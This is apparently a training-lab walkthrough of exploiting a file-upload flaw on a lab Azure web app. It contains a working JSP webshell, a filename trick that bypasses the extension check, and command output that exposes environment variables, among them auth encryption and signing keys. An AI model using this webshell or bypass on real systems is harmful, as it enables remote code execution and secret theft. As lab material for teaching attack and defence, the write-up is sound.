# Attack Lab 9

```
- Find and exploit the File Upload vulnerability and execute OS Level command on the contact application (https://contactpharmacorp.azurewebsites.net/)
− Extract the information from the Application settings
```

## Access to the web resource

Access to the web content and look for source code:

```
view-source:https://contactpharmacorp.azurewebsites.net/
```
At the end of the web application et's possible find a comment of an existing function

```
	<!-- =======================================================
  * Method Name: openUploadForm - v2.3.0
  * Action value: /upload
  * Author: John Doe
  * Change request number: AWS/FREE/01CR02
  ======================================================== 

	<script>

function openUploadForm(){
	

	var form = document.getElementById("UploadForm");
	form.action = '/upload';
	form.submit();
	
	
}
```
The resource discover new web page:

```
https://contactpharmacorp.azurewebsites.net/upload
```

Use burpsuit for insecure file upload:
In order to bypass the file extension validation it's necesary modify the file extension name, beafore upload the webshell:
```
POST /upload?action=upload&callType=ajax HTTP/1.1
Host: contactpharmacorp.azurewebsites.net
Cookie: JSESSIONID=B8D4F807B8532A25388E75C1A30A4518; ARRAffinity=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6; ARRAffinitySameSite=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6
Content-Length: 970
Sec-Ch-Ua: "Chromium";v="103", ".Not/A)Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36
Sec-Ch-Ua-Platform: "Windows"
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary2lULhXypKALMqtYa
Accept: */*
Origin: https://contactpharmacorp.azurewebsites.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://contactpharmacorp.azurewebsites.net/upload
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

------WebKitFormBoundary2lULhXypKALMqtYa
Content-Disposition: form-data; name="file"; filename="student107.js\p"
Content-Type: application/octet-stream

<%@ page
import="java.util.*,java.io.*"%>
<%
%>
<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
<%
if (request.getParameter("cmd") != null) {
out.println("Command: " +
request.getParameter("cmd") + "<BR>");
Process p =
Runtime.getRuntime().exec(request.getParameter("cmd"));
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>
</PRE>
</BODY>
</HTML>
------WebKitFormBoundary2lULhXypKALMqtYa
Content-Disposition: form-data; name="studentx.js\p"


------WebKitFormBoundary2lULhXypKALMqtYa--
```
Response:
```
HTTP/1.1 200 OK
Content-Length: 8
Connection: close
Date: Sun, 08 Oct 2023 09:10:39 GMT
X-Powered-By: ASP.NET

uploaded
```
Using webshell:

```
view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=whoami


<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
Command: whoami<BR>
iis apppool\contactpharmacorp

</PRE>
</BODY>
</HTML>

```
view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=powershell%20-c%20"ls%20webapps/ROOT/WEB-INF/"
```
Command: powershell -c "ls webapps/ROOT/WEB-INF"<BR>


    Directory: C:\home\site\wwwroot\webapps\ROOT\WEB-INF


Mode                LastWriteTime         Length Name                          
----                -------------         ------ ----                          
d-----        10/3/2023  12:08 PM                classes                       
d-----        10/3/2023  12:08 PM                lib                           
-a----         6/3/2022  11:54 AM            362 appengine-web.xml             
-a----         6/3/2022  11:54 AM            139 logging.properties            
------        10/3/2023  12:08 PM            751 web.xml  
```
Evironment variables:

```
view-source:https://contactpharmacorp.azurewebsites.net/studentx.jsp?cmd=cmd%20/c%20set




<HTML>
<BODY>
<H3>JSP SHELL</H3>
<FORM METHOD="GET" NAME="myform"
ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Execute">
</FORM>
<PRE>
Command: cmd /c set<BR>
ACTION=start
AZURE_ENV_INITIALIZED=C:\Program Files\apache-tomcat-9.0.65\bin\
AZURE_LOGGING_DIR=C:\home/LogFiles
AZURE_SITE_APP_BASE=C:\home/site/wwwroot/webapps
AZURE_SITE_HOME=C:\home
AZURE_SITE_LIBS_DIR=C:\home/site/libs
AZURE_UNPACK_WARS=true
CATALINA_BASE=C:\Program Files\apache-tomcat-9.0.65
CATALINA_HOME=C:\Program Files\apache-tomcat-9.0.65
CATALINA_LOGGING_CONFIG=-Djava.util.logging.config.file="C:\Program Files\apache-tomcat-9.0.65\conf\logging.properties"
CATALINA_OPTS= -DuseEncodedApplogs=true
CATALINA_TMPDIR=C:\local\Temp
CLASSPATH=C:\Program Files\apache-tomcat-9.0.65\lib\servlet-api.jar;C:\Program Files\apache-tomcat-9.0.65\lib\azure.appservice.jar;C:\Program Files\apache-tomcat-9.0.65\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.65\bin\tomcat-juli.jar
CURRENT_DIR=C:\home\site\wwwroot
ENDORSED_PROP=ignore.endorsed.dirs
JAVA_OPTS=-Dcatalina.valves.showReport=False -Dcatalina.valves.showServerInfo=False -Dcatalina.maxConnections=10000 -Dcatalina.maxThreads=200  -Dsite.logdir=C:/home/LogFiles -Dsite.home=C:/home -Dsite.libs=C:/home/site/libs -Dsite.appbase=C:/home/site/wwwroot/webapps -Dsite.xmlbase=C:/home/site/wwwroot -Dsite.unpackwars=true -Dsite.tempdir=C:\local\Temp -Dcatalina.instance.name=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6 -Dport.http=18085 -Djava.net.preferIPv4Stack=true -noverify -Dsite.logRetentionDays=1 -Dsite.logRotatable=true -Dsite.connectionTimeout=240000 -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources
JAVA_TMP_DIR=C:\local\Temp
JDK_JAVA_OPTIONS= --add-opens=java.base/java.lang=ALL-UNNAMED --add-opens=java.base/java.io=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED --add-opens=java.base/java.util.concurrent=ALL-UNNAMED --add-opens=java.rmi/sun.rmi.transport=ALL-UNNAMED
JRE_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345
JSSE_OPTS=-Djdk.tls.ephemeralDHKeySize=2048
LOGGING_MANAGER=-Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager
MAINCLASS=org.apache.catalina.startup.Bootstrap
PROMPT=$P$G
SystemDrive=C:
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 79 Stepping 1, GenuineIntel
DOTNET_HOSTING_OPTIMIZATION_CACHE=C:\DotNetCache
PROCESSOR_ARCHITECTURE=AMD64
Path=C:\Python27;C:\Program Files (x86)\nodejs;C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Program Files\Microsoft Network Monitor 3\;C:\Program Files\dotnet;C:\Program Files (x86)\dotnet;C:\Program Files\Git\cmd;C:\Users\packer\AppData\Roaming\npm;C:\Program Files (x86)\nodejs\;C:\Program Files (x86)\Mercurial\;C:\Program Files (x86)\Microsoft ASP.NET\ASP.NET Web Pages\v1.0\;C:\Windows\system32\config\systemprofile\AppData\Local\Microsoft\WindowsApps;C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin;
AZURE_TOMCAT7_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-7.0.94\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-7.0.94\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-7.0.94\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-7.0.94" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
RoleInstanceId=dw0SmallDedicatedWebWorkerRole_8889
AZURE_TOMCAT85_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-8.5.57\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-8.5.57\bin\bootstrap.jar;C:\Program Files\apache-tomcat-8.5.57\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-8.5.57\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"
AZURE_TOMCAT90_HOME=C:\Program Files\apache-tomcat-9.0.37
PROCESSOR_REVISION=4f01
TEMP=C:\local\Temp
USERPROFILE=C:\local\UserProfile
USERNAME=dw0sdwk0006UX$
SystemRoot=C:\Windows
AZURE_TOMCAT85_HOME=C:\Program Files\apache-tomcat-8.5.57
AZURE_TOMCAT7_HOME=C:\Program Files (x86)\apache-tomcat-7.0.94
AZURE_JETTY9_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.1.0.v20131115\start.jar" etc\jetty-logging.xml
CommonProgramFiles=C:\Program Files\Common Files
ProgramData=C:\local\ProgramData
AZURE_JETTY93_HOME=C:\Program Files (x86)\jetty-distribution-9.3.25.v20180904
COMPUTERNAME=dw0sdwk0006UX
RoleName=dw0SmallDedicatedWebWorkerRole
AZURE_TOMCAT10_HOME=C:\Program Files\apache-tomcat-10.0.12
CommonProgramW6432=C:\Program Files\Common Files
AZURE_JETTY9_HOME=C:\Program Files (x86)\jetty-distribution-9.1.0.v20131115
AZURE_TOMCAT90_CMDLINE="-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file=\"C:\Program Files\apache-tomcat-9.0.37\conf\logging.properties\" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir=\"%HOME%\LogFiles\\" -Dsite.tempdir=\"%HOME%\site\workdir\" -classpath \"C:\Program Files\apache-tomcat-9.0.37\bin\bootstrap.jar;C:\Program Files\apache-tomcat-9.0.37\bin\tomcat-juli.jar\" -Dcatalina.base=\"C:\Program Files\apache-tomcat-9.0.37\" -Djava.io.tmpdir=\"%HOME%\site\workdir\" org.apache.catalina.startup.Bootstrap"
TMP=C:\local\Temp
RoleRoot=E:
AZURE_JETTY93_CMDLINE=-Djava.net.preferIPv4Stack=true -Djetty.port=%HTTP_PLATFORM_PORT% -Djetty.base="D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904" -Djetty.webapps="d:\home\site\wwwroot\webapps" -jar "D:\Program Files (x86)\jetty-distribution-9.3.25.v20180904\start.jar" etc\jetty-logging.xml
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
AZURE_TOMCAT10_CMDLINE=-noverify -Djava.net.preferIPv4Stack=true -Dcatalina.instance.name=%WEBSITE_INSTANCE_ID% -Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files\apache-tomcat-10.0.12\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files\apache-tomcat-10.0.12\bin\bootstrap.jar;C:\Program Files\apache-tomcat-10.0.12\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files\apache-tomcat-10.0.12" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
WEBSITE_CATALINA_MAXCONNECTIONS=10000
WEBSITE_CATALINA_MAXTHREADS=200
WEBSITE_TOMCAT_CONNECTION_TIMEOUT=240000
WEBSITE_TOMCAT_LOGS_ROTATABLE=true
windir=C:\Windows
NUMBER_OF_PROCESSORS=1
OS=Windows_NT
ProgramFiles=C:\Program Files
ComSpec=C:\Windows\system32\cmd.exe
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL;.PY;.PYW
AZURE_TOMCAT8_CMDLINE=-Dport.http=%HTTP_PLATFORM_PORT% -Djava.util.logging.config.file="C:\Program Files (x86)\apache-tomcat-8.0.53\conf\logging.properties" -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Dsite.logdir="d:/home/LogFiles/" -Dsite.tempdir="d:\home\site\workdir" -classpath "C:\Program Files (x86)\apache-tomcat-8.0.53\bin\bootstrap.jar;C:\Program Files (x86)\apache-tomcat-8.0.53\bin\tomcat-juli.jar" -Dcatalina.base="C:\Program Files (x86)\apache-tomcat-8.0.53" -Djava.io.tmpdir="d:\home\site\workdir" org.apache.catalina.startup.Bootstrap
ALLUSERSPROFILE=C:\local\ProgramData
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules;C:\Program Files\WindowsPowerShell\Modules\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ResourceManager\AzureResourceManager\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\ServiceManagement\;C:\Program Files (x86)\Microsoft SDKs\Azure\PowerShell\Storage\;C:\Program Files\Microsoft Message Analyzer\PowerShell\
APPDATA=C:\local\AppData
USERDOMAIN=WORKGROUP
PROCESSOR_LEVEL=6
LOCALAPPDATA=C:\local\LocalAppData
ResourceDrive=D:\
AZURE_TOMCAT8_HOME=C:\Program Files (x86)\apache-tomcat-8.0.53
PUBLIC=C:\Users\Public
AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/
APPSETTING_AnalyticsAppServiceEndpoint=https://analytics.pharmacorphq.com/
WEBSITE_HTTPLOGGING_RETENTION_DAYS=1
APPSETTING_WEBSITE_HTTPLOGGING_RETENTION_DAYS=1
ScmType=None
APPSETTING_ScmType=None
WEBSITE_SITE_NAME=contactpharmacorp
APPSETTING_WEBSITE_SITE_NAME=contactpharmacorp
WEBSITE_AUTH_ENABLED=False
APPSETTING_WEBSITE_AUTH_ENABLED=False
REMOTEDEBUGGINGVERSION=16.0.30709.132
APPSETTING_REMOTEDEBUGGINGVERSION=16.0.30709.132
FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
APPSETTING_FUNCTIONS_RUNTIME_SCALE_MONITORING_ENABLED=0
WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
APPSETTING_WEBSITE_AUTH_LOGOUT_PATH=/.auth/logout
WEBSITE_AUTH_AUTO_AAD=False
APPSETTING_WEBSITE_AUTH_AUTO_AAD=False
REGION_NAME=France Central
HOME=C:\home
HOME_EXPANDED=D:\DWASFiles\Sites\contactpharmacorp\VirtualDirectory0
LOCAL_EXPANDED=D:\DWASFiles\Sites\contactpharmacorp
windows_tracing_flags=
windows_tracing_logfile=
WEBSITE_INSTANCE_ID=997260270c326e2938e72fa9af69674fa8b4402f8e9e65121c461d08eb0abce6
WEBSITE_HTTPLOGGING_ENABLED=0
WEBSITE_SCM_ALWAYS_ON_ENABLED=1
WEBSITE_ISOLATION=pico
WEBSITE_OS=windows
WEBSITE_DEPLOYMENT_ID=contactpharmacorp
WEBSITE_INFRASTRUCTURE_IP=10.10.0.118
WEBSITE_COMPUTE_MODE=Dedicated
WEBSITE_SKU=Basic
WEBSITE_ELASTIC_SCALING_ENABLED=0
WEBSITE_SCM_SEPARATE_STATUS=1
WEBSITE_IIS_SITE_NAME=contactpharmacorp
WEBSITE_APPSERVICEAPPLOGS_TRACE_ENABLED=true
WEBSITE_CHANGEANALYSISSCAN_ENABLED=1
MicrosoftInstrumentationEngine_LatestPath=C:\Program Files (x86)\SiteExtensions\InstrumentationEngine\1.0.43
JAVA_HOME=C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345
SITE_BITNESS=x86
WEBSITE_AUTH_ENCRYPTION_KEY=31C2C4A2E2448C4CDAA057A4C1E29F22C32164D5F03CD51652B338FB048A888F
WEBSITE_AUTH_SIGNING_KEY=E2D13052812E98A152DD6441BF4B62EC13F5A8F7E3F16FFEFD327172BA6DA179
WEBSITE_PROACTIVE_AUTOHEAL_ENABLED=True
WEBSITE_PROACTIVE_STACKTRACING_ENABLED=True
WEBSITE_PROACTIVE_CRASHMONITORING_ENABLED=True
WEBSITE_CRASHMONITORING_USE_DEBUGDIAG=True
WEBSITE_DYNAMIC_CACHE=1
WEBSITE_FRAMEWORK_JIT=1
WEBSITE_HOME_STAMPNAME=waws-prod-par-021
WEBSITE_CURRENT_STAMPNAME=waws-prod-par-021
WEBSOCKET_CONCURRENT_REQUEST_LIMIT=350
WEBSITE_VOLUME_TYPE=PrimaryStorageVolume
WEBSITE_OWNER_NAME=aac02f74-b0d2-45d2-8fbc-8d33f274116f+Analytics-FranceCentralwebspace
WEBSITE_RESOURCE_GROUP=analytics
WEBSITE_CONTAINER_READY=1
WEBSITE_PHYSICAL_MEMORY_MB=2047
WEBSITE_JAVA_MAX_HEAP_MB=1432
WEBSITE_STACK=TOMCAT
WEBSITE_PLATFORM_VERSION=100.0.7.517
REMOTEDEBUGGINGPORT=
REMOTEDEBUGGINGBITVERSION=vx86
WEBSITE_LOCALCACHE_ENABLED=False
WEBSITE_HOSTNAME=contactpharmacorp.azurewebsites.net
WEBSITE_RELAYS=
WEBSITE_REWRITE_TABLE=
HTTP_PLATFORM_PORT=18085
_EXECJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\java.exe"
_RUNJAVA="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\java.exe"
_RUNJDB="C:\Program Files\Java\Adoptium-Eclipse-Temurin-OpenJDK-8u345\bin\jdb.exe"

</PRE>
</BODY>
</HTML>

```
